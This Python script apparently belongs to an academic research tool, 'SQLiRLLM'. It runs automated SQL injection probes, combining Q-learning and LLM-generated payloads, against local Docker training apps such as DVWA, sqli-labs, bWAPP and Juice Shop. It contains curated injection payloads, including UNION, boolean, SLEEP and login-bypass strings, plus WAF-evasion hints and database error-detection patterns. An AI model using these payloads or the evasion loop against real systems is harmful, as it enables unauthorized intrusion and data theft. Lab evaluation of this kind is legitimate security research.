"""SQLiRLLM live-target runner against Docker vulnerable applications.

Probes the same Docker endpoints as sqlmap_runner.py using the full
SQLiRLLM pipeline (Q-Learning + LLM payloads + LLM analysis + ethics guard),
and writes structured results to results/live/sqlirllm_results.json for
comparison.

Usage:
    python -m experiments.live.sqlirllm_runner
    python -m experiments.live.sqlirllm_runner --targets dvwa_sqli sqli_labs_1
    python -m experiments.live.sqlirllm_runner --strategies error_based time_blind
    python -m experiments.live.sqlirllm_runner --max-attempts 5 --request-timeout 20
"""
from __future__ import annotations

import argparse
import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

from sqlirllm.analyzer import Analyzer
from sqlirllm.config import CONFIG, STRATEGIES
from sqlirllm.environment import WAF, evasion_score, looks_like_injection
from sqlirllm.ethics import EthicsGuard
from sqlirllm.llm_client import LLMClient
from sqlirllm.payload_generator import PayloadGenerator
from sqlirllm.qlearning import QLearningAgent, encode_state
from sqlirllm.environment import ExecutionResponse, Outcome

RESULTS = Path(__file__).resolve().parent.parent.parent / "results" / "live"

# --------------------------------------------------------------------------- #
# Live target definitions (mirror those in sqlmap_runner)                     #
# --------------------------------------------------------------------------- #
@dataclass
class LiveHTTPTarget:
    name: str
    platform: str
    method: str  # "GET" or "POST"
    url: str
    param: str               # parameter to inject into
    base_value: str
    cookie: Optional[str] = None
    content_type: str = "application/x-www-form-urlencoded"
    extra_params: Dict[str, str] = field(default_factory=dict)
    has_waf: bool = False
    framework: str = "php"
    database: str = "mysql"
    authorized: bool = True
    expected_vulnerable: bool = True
    port: Optional[int] = None
    difficulty: Optional[str] = None
    session_flow: str = "direct"
    session: Optional[requests.Session] = None


LIVE_TARGETS: Dict[str, LiveHTTPTarget] = {
    "dvwa_sqli": LiveHTTPTarget(
        "dvwa_sqli", "DVWA", "GET",
        "http://127.0.0.1:8090/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=low",
        extra_params={"Submit": "Submit"},
        framework="php", database="mysql",
        port=8090, difficulty="low",
    ),
    "dvwa_sqli_medium": LiveHTTPTarget(
        "dvwa_sqli_medium", "DVWA (medium)", "POST",
        "http://127.0.0.1:8090/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=medium",
        extra_params={"Submit": "Submit"},
        framework="php", database="mysql",
        port=8090, difficulty="medium",
    ),
    "dvwa_sqli_hard": LiveHTTPTarget(
        "dvwa_sqli_hard", "DVWA (hard)", "GET",
        "http://127.0.0.1:8095/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=high",
        extra_params={"Submit": "Submit"},
        framework="php", database="mysql",
        port=8095, difficulty="high", session_flow="dvwa_high",
    ),
    "dvwa_sqli_max": LiveHTTPTarget(
        "dvwa_sqli_max", "DVWA (max/impossible)", "GET",
        "http://127.0.0.1:8096/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=impossible",
        extra_params={"Submit": "Submit"},
        framework="php", database="mysql",
        expected_vulnerable=False, port=8096, difficulty="impossible", session_flow="dvwa_token",
    ),
    "dvwa_waf": LiveHTTPTarget(
        "dvwa_waf", "DVWA+ModSecurity", "GET",
        "http://127.0.0.1:8080/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=low",
        extra_params={"Submit": "Submit"},
        has_waf=True, framework="php", database="mysql",
        port=8080, difficulty="low",
    ),
    "sqli_labs_1": LiveHTTPTarget(
        "sqli_labs_1", "sqli-labs Less-1", "GET",
        "http://127.0.0.1:8094/Less-1/",
        param="id", base_value="1",
        framework="php", database="mysql",
        port=8094,
    ),
    "sqli_labs_11": LiveHTTPTarget(
        "sqli_labs_11", "sqli-labs Less-11", "POST",
        "http://127.0.0.1:8094/Less-11/",
        param="uname", base_value="admin",
        extra_params={"passwd": "admin", "submit": "Submit"},
        framework="php", database="mysql",
        port=8094,
    ),
    "bwapp_sqli": LiveHTTPTarget(
        "bwapp_sqli", "bWAPP", "GET",
        "http://127.0.0.1:8091/sqli_1.php",
        param="title", base_value="iron man",
        cookie="PHPSESSID=placeholder; security_level=0",
        extra_params={"action": "search"},
        framework="php", database="mysql",
        port=8091,
    ),
    "juiceshop_login": LiveHTTPTarget(
        "juiceshop_login", "Juice Shop", "POST",
        "http://127.0.0.1:8092/rest/user/login",
        param="email", base_value="test@test.com",
        content_type="application/json",
        extra_params={"password": "test"},
        framework="express", database="sqlite",
        port=8092,
    ),
}


# --------------------------------------------------------------------------- #
# HTTP probe                                                                   #
# --------------------------------------------------------------------------- #
_DB_ERROR_PATTERNS = re.compile(
    r"sql syntax|ORA-\d+|SQLITE_ERROR|unclosed quotation|syntax error in your|"
    r"mysql_fetch|pg_query|You have an error|Microsoft OLE DB|ODBC SQL Server|"
    r"supplied argument is not a valid MySQL|Warning.*mysql_.*\(\)",
    re.I,
)
_UNION_PATTERNS = re.compile(
    r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[0-9a-f]{32}|root@|"
    r"information_schema|CURRENT_USER\(\))",
    re.I,
)
_TIME_THRESHOLD_MS = 3500.0  # deliberate delay suggests time-based injection


def _looks_like_login_or_setup_page(body: str) -> bool:
    body_lower = body.lower()
    return any(
        marker in body_lower
        for marker in (
            "login :: damn vulnerable web application",
            "<title>bwapp - login</title>",
            "create / reset database",
            "unable to connect to the database",
            "location: setup.php",
            "location: login.php",
            "name='user_token'",
        )
    )


def _extract_hidden_token(html: str, name: str) -> str:
    patterns = [
        rf"name=['\"]{re.escape(name)}['\"]\s+value=['\"]([^'\"]+)",
        rf"value=['\"]([^'\"]+)['\"]\s+name=['\"]{re.escape(name)}['\"]",
    ]
    for pattern in patterns:
        match = re.search(pattern, html, re.I)
        if match:
            return match.group(1)
    return ""


def _prepare_sqli_labs() -> None:
    try:
        requests.get("http://127.0.0.1:8094/sql-connections/setup-db.php", timeout=30)
    except Exception:
        return


def _prepare_bwapp() -> None:
    try:
        requests.get("http://127.0.0.1:8091/install.php?install=yes", timeout=30)
    except Exception:
        return


def _get_bwapp_session(level: int = 0) -> Optional[str]:
    try:
        session = requests.Session()
        session.get("http://127.0.0.1:8091/login.php", timeout=15)
        session.post(
            "http://127.0.0.1:8091/login.php",
            data={
                "login": "bee",
                "password": "bug",
                "security_level": str(level),
                "form": "submit",
            },
            allow_redirects=True,
            timeout=15,
        )
        sid = session.cookies.get("PHPSESSID")
        if not sid:
            return None
        return f"PHPSESSID={sid}; security_level={level}"
    except Exception:
        return None


def _get_dvwa_session(base_url: str, level: str = "low") -> Optional[str]:
    try:
        session = requests.Session()
        login_url = f"{base_url.rstrip('/')}/login.php"
        login_page = session.get(login_url, timeout=15)
        token = _extract_hidden_token(login_page.text, "user_token")
        session.post(
            login_url,
            data={
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token,
            },
            allow_redirects=False,
            timeout=15,
        )
        sid = session.cookies.get("PHPSESSID")
        if not sid:
            return None
        return f"PHPSESSID={sid}; security={level}"
    except Exception:
        return None


def _setup_dvwa(base_url: str) -> None:
    try:
        session = requests.Session()
        setup_url = f"{base_url.rstrip('/')}/setup.php"
        setup_page = session.get(setup_url, timeout=20)
        token = _extract_hidden_token(setup_page.text, "user_token")
        payload = {"create_db": "Create / Reset Database"}
        if token:
            payload["user_token"] = token
        session.post(setup_url, data=payload, allow_redirects=True, timeout=20)
    except Exception:
        return


def _create_dvwa_session(base_url: str, level: str) -> Optional[requests.Session]:
    try:
        _setup_dvwa(base_url)
        session = requests.Session()
        login_url = f"{base_url.rstrip('/')}/login.php"
        login_page = session.get(login_url, timeout=15)
        token = _extract_hidden_token(login_page.text, "user_token")
        resp = session.post(
            login_url,
            data={
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token,
            },
            allow_redirects=True,
            timeout=15,
        )
        if "Login :: Damn Vulnerable Web Application" in resp.text:
            return None
        security_url = f"{base_url.rstrip('/')}/security.php"
        security_page = session.get(security_url, timeout=15)
        sec_token = _extract_hidden_token(security_page.text, "user_token")
        payload = {"security": level, "seclev_submit": "Submit"}
        if sec_token:
            payload["user_token"] = sec_token
        session.post(security_url, data=payload, allow_redirects=True, timeout=15)
        return session
    except Exception:
        return None


def _refresh_dvwa_token(target: LiveHTTPTarget) -> Dict[str, str]:
    if target.session is None:
        return {}
    try:
        page = target.session.get(target.url, timeout=15)
        token = _extract_hidden_token(page.text, "user_token")
        return {"user_token": token} if token else {}
    except Exception:
        return {}


def _prepare_target(target: LiveHTTPTarget) -> None:
    if "sqli_labs" in target.name:
        _prepare_sqli_labs()
        return
    if "bwapp" in target.name:
        _prepare_bwapp()
        cookie = _get_bwapp_session(level=0)
        if cookie:
            target.cookie = cookie
        return
    if "dvwa" in target.name:
        if target.port is None or target.difficulty is None:
            return
        session = _create_dvwa_session(f"http://127.0.0.1:{target.port}", target.difficulty)
        if session is None:
            return
        target.session = session
        sid = session.cookies.get("PHPSESSID")
        if sid:
            target.cookie = f"PHPSESSID={sid}; security={target.difficulty}"


def _send_request(target: LiveHTTPTarget, payload: str, timeout: float) -> requests.Response:
    session = target.session or requests.Session()
    headers = {"User-Agent": "SQLiRLLM-Research/1.0 (academic evaluation)"}
    if target.cookie:
        headers["Cookie"] = target.cookie
    if target.content_type and target.method == "POST":
        headers["Content-Type"] = target.content_type

    if target.session_flow == "dvwa_high":
        popup_url = target.url.replace("/vulnerabilities/sqli/", "/vulnerabilities/sqli/session-input.php")
        session.post(
            popup_url,
            data={"id": payload, "Submit": "Submit"},
            headers=headers,
            timeout=timeout,
            allow_redirects=True,
        )
        return session.get(target.url, headers=headers, timeout=timeout, allow_redirects=True)

    if target.method == "GET":
        params = dict(target.extra_params)
        params[target.param] = payload
        if target.session_flow == "dvwa_token":
            params.update(_refresh_dvwa_token(target))
        return session.get(target.url, params=params, headers=headers, timeout=timeout, allow_redirects=True)

    if "application/json" in target.content_type:
        data = dict(target.extra_params)
        data[target.param] = payload
        return session.post(target.url, json=data, headers=headers, timeout=timeout)

    data = dict(target.extra_params)
    data[target.param] = payload
    return session.post(target.url, data=data, headers=headers, timeout=timeout)


def probe(target: LiveHTTPTarget, payload: str, timeout: float = 12.0) -> ExecutionResponse:
    """Send the payload to the live target and return an ExecutionResponse."""
    t0 = time.perf_counter()
    try:
        resp = _send_request(target, payload, timeout)
        latency = (time.perf_counter() - t0) * 1000.0
        body = resp.text[:2000]
        status = resp.status_code
    except requests.exceptions.Timeout:
        return ExecutionResponse(0, "", timeout * 1000, Outcome.SAFE)
    except Exception as exc:
        return ExecutionResponse(0, str(exc)[:200], 0.0, Outcome.SAFE)

    # Classify outcome for response-analysis context.
    if _looks_like_login_or_setup_page(body):
        outcome = Outcome.SAFE
    elif status in (403, 406) or "ModSecurity" in body or "blocked" in body.lower():
        outcome = Outcome.BLOCKED
    elif latency > _TIME_THRESHOLD_MS:
        outcome = Outcome.VULNERABLE
    elif _DB_ERROR_PATTERNS.search(body) or _UNION_PATTERNS.search(body):
        outcome = Outcome.VULNERABLE
    else:
        outcome = Outcome.SAFE

    return ExecutionResponse(status, body, latency, outcome)


def _infer_waf_filters(payload: str, response: ExecutionResponse, attempt: int) -> str:
    """Infer which WAF filters were likely triggered based on response and payload."""
    if response.outcome != Outcome.BLOCKED or not response.body:
        return ""
    
    body_lower = response.body.lower()
    signals = []
    
    # Detect keyword-based filters
    dangerous_keywords = [
        "union", "select", "from", "where", "and", "or", "sleep",
        "information_schema", "benchmark", "load_file", "into", "order", "group"
    ]
    for kw in dangerous_keywords:
        if kw in payload.lower():
            signals.append(f"keyword '{kw}' may have triggered filter")
    
    # Detect encoding/obfuscation detection
    if "%" in payload and "encode" in body_lower:
        signals.append("URL encoding detected by WAF")
    if "/*" in payload and ("comment" in body_lower or "syntax" in body_lower):
        signals.append("SQL comments detected as suspicious")
    if "%27" in payload or "%22" in payload:
        signals.append("Character encoding detected")
    
    # Specific CRS patterns
    if "modsecurity" in body_lower:
        if attempt == 0:
            signals.append("Use aggressive URL encoding and character substitution")
        elif attempt == 1:
            signals.append("ModSecurity active; try double-encoding and nested comments")
        else:
            signals.append("ModSecurity resisting; escalate to semantic variations and hex encoding")
    
    feedback = "; ".join(signals) if signals else "WAF blocked payload; escalate evasion techniques"
    return feedback[:256]


def _curated_payload(target: LiveHTTPTarget, strategy: str, attempt: int) -> Optional[str]:
    curated: Dict[str, Dict[str, List[str]]] = {
        "dvwa_sqli": {
            "error_based": ["1'"],
            "boolean_blind": ["1 or 1=1", "1 and 1=1"],
        },
        "dvwa_sqli_medium": {
            "error_based": ["1'"],
            "boolean_blind": ["1 or 1=1", "1 and 1=1"],
        },
        "dvwa_sqli_hard": {
            "error_based": ["1'"],
            "union_based": ["1' UNION SELECT 1,2#"],
        },
        "dvwa_sqli_max": {
            "error_based": ["1'"],
            "boolean_blind": ["1 and 1=1"],
        },
        "dvwa_waf": {
            "error_based": ["1'"],
            "boolean_blind": ["1 or 1=1"],
        },
        "sqli_labs_1": {
            "union_based": ["1' UNION SELECT 2,3-- -"],
            "error_based": ["1'"],
        },
        "sqli_labs_11": {
            "error_based": ["admin'"],
            "boolean_blind": ["admin') or ('1'='1"],
        },
        "bwapp_sqli": {
            "error_based": ["iron man'", "iron man' UNION SELECT 1,2#"],
            "boolean_blind": ["iron man' or '1'='1"],
            "time_blind": ["iron man' AND SLEEP(3)#"],
        },
        "juiceshop_login": {
            "boolean_blind": ["' or 1=1--", "admin@juice-sh.op' -- "],
            "error_based": ["' OR 1=1/*"],
        },
    }
    choices = curated.get(target.name, {}).get(strategy)
    if not choices:
        defaults = {
            "error_based": ["1'"],
            "boolean_blind": ["1 or 1=1"],
            "union_based": ["1' UNION SELECT 1,2#"],
            "time_blind": ["1' AND SLEEP(3)#"],
        }
        choices = defaults.get(strategy)
    if not choices:
        return None
    return choices[min(attempt, len(choices) - 1)]


def _proof_vulnerable(
    target: LiveHTTPTarget,
    response: ExecutionResponse,
    baseline: ExecutionResponse,
) -> Tuple[bool, str]:
    body = response.body
    body_lower = body.lower()
    baseline_lower = baseline.body.lower()

    if _looks_like_login_or_setup_page(body):
        return False, "login-or-setup-page"
    if response.status_code == 403:
        return False, "waf-blocked"

    if target.name == "juiceshop_login":
        return ('"authentication"' in body_lower and '"token"' in body_lower, "auth-token-issued")

    if target.name == "dvwa_sqli_max":
        if "source/impossible.php" in body_lower or "csrf token is incorrect" in body_lower:
            return False, "protected-impossible-mode"
        if _DB_ERROR_PATTERNS.search(body):
            return False, "handled-impossible-input"
        return False, "no-proof-in-impossible-mode"

    if target.name == "dvwa_sqli_hard":
        if "source/high.php" in body_lower and (_DB_ERROR_PATTERNS.search(body) or "fatal error" in body_lower):
            return True, "high-mode-sql-error"
        if "first name:" in body_lower and "surname:" in body_lower and len(body) != len(baseline.body):
            return True, "high-mode-session-delta"
        return False, "no-high-mode-proof"

    if target.name.startswith("dvwa_"):
        if _DB_ERROR_PATTERNS.search(body) or "fatal error" in body_lower:
            return True, "dvwa-sql-error"
        if response.latency_ms - baseline.latency_ms >= 2500:
            return True, "dvwa-time-delay"
        if "first name:" in body_lower and "surname:" in body_lower and len(body) != len(baseline.body):
            return True, "dvwa-result-delta"
        return False, "no-dvwa-proof"

    if target.name == "sqli_labs_1":
        if "your login name:" in body_lower and "your password:" in body_lower:
            return True, "sqli-labs-data-leak"
        if "duplicate entry" in body_lower or _DB_ERROR_PATTERNS.search(body):
            return True, "sqli-labs-error"
        return False, "no-less1-proof"

    if target.name == "sqli_labs_11":
        if "error based" in body_lower and len(body) - len(baseline.body) > 40:
            return True, "less11-size-delta"
        if _DB_ERROR_PATTERNS.search(body):
            return True, "less11-error"
        return False, "no-less11-proof"

    if target.name == "bwapp_sqli":
        if _DB_ERROR_PATTERNS.search(body):
            return True, "bwapp-sql-error"
        if response.latency_ms - baseline.latency_ms >= 2500:
            return True, "bwapp-time-delay"
        if "welcome bee" in body_lower and len(body) != len(baseline.body):
            return True, "bwapp-content-delta"
        if abs(len(body) - len(baseline.body)) >= 1000:
            return True, "bwapp-response-delta"
        return False, "no-bwapp-proof"

    if response.latency_ms - baseline.latency_ms >= 2500:
        return True, "time-delay"
    if _DB_ERROR_PATTERNS.search(body):
        return True, "db-error"
    return False, "no-proof"


# --------------------------------------------------------------------------- #
# Per-target test                                                              #
# --------------------------------------------------------------------------- #
@dataclass
class LiveTestResult:
    target_name: str
    platform: str
    has_waf: bool
    strategies_tried: int
    strategies_succeeded: int
    waf_encounters: int
    waf_bypasses: int
    best_strategy: Optional[str]
    best_payload: Optional[str]
    best_evasion_score: float
    total_duration_s: float
    ethical_violations: int
    expected_vulnerable: bool
    detailed: List[Dict] = field(default_factory=list)


def test_target(
    target: LiveHTTPTarget,
    agent: QLearningAgent,
    payload_gen: PayloadGenerator,
    analyzer: Analyzer,
    guard: EthicsGuard,
    strategy_subset: Optional[List[str]] = None,
    max_attempts: int = 3,
    request_timeout: float = 12.0,
) -> LiveTestResult:
    t_start = time.perf_counter()
    _prepare_target(target)
    baseline = probe(target, target.base_value, timeout=request_timeout)

    state = encode_state({
        "framework": target.framework,
        "database": target.database,
        "waf": "present" if target.has_waf else "absent",
        "phase": "initial",
    })
    ordered_strategies = agent.ranked_strategies(state)
    if strategy_subset:
        allowed = set(strategy_subset)
        ordered_strategies = [s for s in ordered_strategies if s in allowed]

    result = LiveTestResult(
        target_name=target.name,
        platform=target.platform,
        has_waf=target.has_waf,
        strategies_tried=0,
        strategies_succeeded=0,
        waf_encounters=0,
        waf_bypasses=0,
        best_strategy=None,
        best_payload=None,
        best_evasion_score=0.0,
        total_duration_s=0.0,
        ethical_violations=0,
        expected_vulnerable=target.expected_vulnerable,
    )

    context = {
        "framework": target.framework,
        "database": target.database,
        "waf": "present" if target.has_waf else "absent",
        "phase": "initial",
    }

    for strategy in ordered_strategies:
        auth = guard.authorize(target.name, strategy)
        if not auth.authorized:
            result.ethical_violations += 1
            continue

        result.strategies_tried += 1
        succeeded = False
        feedback = ""

        for attempt in range(max_attempts):
            payload = _curated_payload(target, strategy, attempt)
            if payload is None:
                payload = payload_gen.generate(strategy, context, attempt, feedback=feedback)
            escore = evasion_score(payload)
            response = probe(target, payload, timeout=request_timeout)

            if target.has_waf:
                result.waf_encounters += 1
                if response.outcome != Outcome.BLOCKED:
                    result.waf_bypasses += 1
                    context["phase"] = "verification"
                    feedback = "WAF bypassed on previous attempt; prioritize exploit confirmation"
                else:
                    context["phase"] = "waf_evasion"
                    # Use intelligent feedback inference
                    feedback = _infer_waf_filters(payload, response, attempt)

            analysis = analyzer.analyze(strategy, response)
            proof_vulnerable, proof_signal = _proof_vulnerable(target, response, baseline)

            row = {
                "strategy": strategy,
                "attempt": attempt,
                "payload": payload[:120],
                "evasion_score": round(escore, 2),
                "http_status": response.status_code,
                "latency_ms": round(response.latency_ms, 0),
                "outcome": response.outcome.value,
                "llm_verdict": analysis.vulnerable,
                "proof_verdict": proof_vulnerable,
                "severity": analysis.severity,
                "signal": proof_signal,
                "llm_signal": analysis.signal,
            }
            result.detailed.append(row)

            if proof_vulnerable:
                succeeded = True
                if escore > result.best_evasion_score:
                    result.best_strategy = strategy
                    result.best_payload = payload
                    result.best_evasion_score = escore
                break

        if succeeded:
            result.strategies_succeeded += 1

    result.total_duration_s = round(time.perf_counter() - t_start, 1)
    return result


# --------------------------------------------------------------------------- #
# Main                                                                         #
# --------------------------------------------------------------------------- #
def run(
    target_names: List[str],
    strategy_subset: Optional[List[str]] = None,
    max_attempts: int = 3,
    request_timeout: float = 12.0,
    seed: Optional[int] = None,
    llm_use_cache: bool = True,
    strict_llm_api: bool = False,
    verify_api_ping: bool = False,
) -> List[Dict]:
    RESULTS.mkdir(parents=True, exist_ok=True)
    cfg = CONFIG
    client = LLMClient(cfg.llm)
    if strict_llm_api and not cfg.llm.is_configured:
        raise RuntimeError(
            "strict_llm_api=True but GAPGPT_API_KEY is not configured. "
            "Set GAPGPT_API_KEY in environment or .env."
        )
    if verify_api_ping:
        ping = client.chat(
            model=cfg.llm.payload_model,
            system="Return exactly OK.",
            user="Return OK",
            temperature=0.0,
            max_tokens=8,
            use_cache=False,
        )
        if not ping:
            raise RuntimeError("LLM API verification ping failed before live run.")
        print("  [sqlirllm] API ping succeeded")
    effective_seed = cfg.seed if seed is None else seed
    agent = QLearningAgent(cfg.qlearning, seed=effective_seed)
    payload_gen = PayloadGenerator(client, cfg.llm, seed=effective_seed, use_cache=llm_use_cache)
    analyzer = Analyzer(client, cfg.llm, llm_enabled=False, use_cache=llm_use_cache)
    guard = EthicsGuard(authorized_targets={n for n in target_names})

    if strategy_subset:
        invalid = sorted(set(strategy_subset) - set(STRATEGIES))
        if invalid:
            raise ValueError(f"Unknown strategies: {invalid}. Valid: {STRATEGIES}")
        print(f"  [sqlirllm] strategy subset={strategy_subset}")
    print(
        f"  [sqlirllm] max_attempts={max_attempts} request_timeout={request_timeout}s "
        f"seed={effective_seed} llm_cache={llm_use_cache} strict_llm_api={strict_llm_api}"
    )

    rows: List[Dict] = []
    for name in target_names:
        t = LIVE_TARGETS.get(name)
        if t is None:
            print(f"  [warn] unknown target '{name}'")
            continue
        print(f"  [sqlirllm] {name}  ({t.platform}, waf={t.has_waf})")
        try:
            r = test_target(
                t,
                agent,
                payload_gen,
                analyzer,
                guard,
                strategy_subset=strategy_subset,
                max_attempts=max_attempts,
                request_timeout=request_timeout,
            )
            bypass_rate = r.waf_bypasses / r.waf_encounters if r.waf_encounters else None
            d: Dict = {
                "tool": "SQLiRLLM",
                "target": r.target_name,
                "platform": r.platform,
                "has_waf": r.has_waf,
                "strategies_tried": r.strategies_tried,
                "strategies_succeeded": r.strategies_succeeded,
                "waf_encounters": r.waf_encounters,
                "waf_bypasses": r.waf_bypasses,
                "waf_bypass_rate": round(bypass_rate, 2) if bypass_rate is not None else None,
                "best_strategy": r.best_strategy,
                "best_evasion_score": round(r.best_evasion_score, 2),
                "total_duration_s": r.total_duration_s,
                "ethical_violations": r.ethical_violations,
                "expected_vulnerable": r.expected_vulnerable,
                "detailed": r.detailed,
            }
            rows.append(d)
            print(f"    -> succeeded={r.strategies_succeeded}/{r.strategies_tried} "
                  f"waf_bypass={bypass_rate} best={r.best_strategy} "
                  f"time={r.total_duration_s}s")
        except Exception as exc:
            print(f"    -> ERROR {exc}")
            rows.append({"tool": "SQLiRLLM", "target": name, "error": str(exc)})

    out = RESULTS / "sqlirllm_results.json"
    out.write_text(json.dumps(rows, indent=2))
    telemetry = {
        "llm_configured": cfg.llm.is_configured,
        "api_calls": client.calls,
        "cache_hits": client.cache_hits,
        "offline_payload_fallbacks": payload_gen.offline_used,
        "analyzer_llm_calls": analyzer.llm_calls,
        "analyzer_heuristic_calls": analyzer.heuristic_calls,
        "llm_cache_enabled": llm_use_cache,
        "strict_llm_api": strict_llm_api,
        "verify_api_ping": verify_api_ping,
    }
    telemetry_out = RESULTS / "sqlirllm_telemetry.json"
    telemetry_out.write_text(json.dumps(telemetry, indent=2))
    print(
        "  [sqlirllm] telemetry "
        f"api_calls={client.calls} cache_hits={client.cache_hits} "
        f"offline_fallbacks={payload_gen.offline_used} analyzer_llm={analyzer.llm_calls} "
        f"analyzer_heuristic={analyzer.heuristic_calls}"
    )
    if strict_llm_api and client.calls == 0:
        raise RuntimeError(
            "No live LLM API calls were made (api_calls=0). "
            "Disable cache with --no-llm-cache or clear results/cache and retry."
        )
    print(f"\n  SQLiRLLM live results -> {out}")
    print(f"  SQLiRLLM telemetry -> {telemetry_out}")
    return rows


def main() -> None:
    p = argparse.ArgumentParser(description="SQLiRLLM live-target runner.")
    p.add_argument("--targets", nargs="+", default=list(LIVE_TARGETS.keys()),
                   choices=list(LIVE_TARGETS.keys()), metavar="T")
    p.add_argument("--strategies", nargs="+", default=None,
                   choices=list(STRATEGIES), metavar="STRATEGY",
                   help="Restrict live tests to selected SQLi strategy families.")
    p.add_argument("--max-attempts", type=int, default=3,
                   help="Payload attempts per strategy before moving to next strategy.")
    p.add_argument("--request-timeout", type=float, default=12.0,
                   help="HTTP timeout in seconds for each live probe request.")
    p.add_argument("--seed", type=int, default=None,
                   help="Override random seed for policy/payload ordering reproducibility.")
    p.add_argument("--no-llm-cache", action="store_true",
                   help="Disable LLM response cache (forces fresh provider requests).")
    p.add_argument("--strict-llm-api", action="store_true",
                   help="Fail the run if zero live LLM provider calls are made.")
    p.add_argument("--verify-api-ping", action="store_true",
                   help="Send a tiny uncached test request before running targets.")
    args = p.parse_args()
    run(
        args.targets,
        strategy_subset=args.strategies,
        max_attempts=args.max_attempts,
        request_timeout=args.request_timeout,
        seed=args.seed,
        llm_use_cache=not args.no_llm_cache,
        strict_llm_api=args.strict_llm_api,
        verify_api_ping=args.verify_api_ping,
    )


if __name__ == "__main__":
    main()
